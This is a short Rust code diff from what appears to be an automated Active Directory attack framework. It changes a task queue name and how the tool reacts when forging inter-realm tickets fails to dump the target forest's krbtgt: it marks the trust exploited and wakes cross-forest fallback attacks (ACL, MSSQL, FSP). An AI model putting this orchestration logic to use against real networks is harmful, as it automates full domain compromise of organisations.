@@ -1120,7 +1120,7 @@ pub async fn auto_trust_follow(dispatcher: Arc<Dispatcher>, mut shutdown: watch:
                     }
 
                     match dispatcher
-                        .throttled_submit("credential_access", "privesc", payload, 2)
+                        .throttled_submit("credential_access", "credential_access", payload, 2)
                         .await
                     {
                         Ok(Some(task_id)) => {
@@ -1739,12 +1739,26 @@ pub async fn auto_trust_follow(dispatcher: Arc<Dispatcher>, mut shutdown: watch:
                                 .persist_timeline_event(&dispatcher_bg.queue, &event, &techniques)
                                 .await;
                         } else {
+                            // Tool ran cleanly but no target krbtgt landed in
+                            // discoveries — this is a deterministic failure
+                            // (SID filtering, denied permissions, or wrong
+                            // forest) that won't change on the next 30s tick.
+                            // Keep dedup MARKED so we don't relitigate the
+                            // doomed forge in a tight loop, mark the trust
+                            // vuln exploited so the operation moves on, and
+                            // wake the cross-forest fallback paths
+                            // (ACL/MSSQL/FSP) which can still compromise the
+                            // target forest without ExtraSid.
                             warn!(
                                 source_domain = %source_domain_bg,
                                 target_domain = %target_domain_bg,
-                                "forge_inter_realm_and_dump completed but no target krbtgt observed — clearing dedup for retry"
+                                "forge_inter_realm_and_dump completed but no target krbtgt observed — locking dedup, waking fallbacks"
                             );
-                            clear_dedup().await;
+                            let _ = dispatcher_bg
+                                .state
+                                .mark_exploited(&dispatcher_bg.queue, &vuln_id_bg)
+                                .await;
+                            wake_cross_forest_fallbacks(&dispatcher_bg, &target_domain_bg).await;
                         }
                     }
                     Err(e) => {
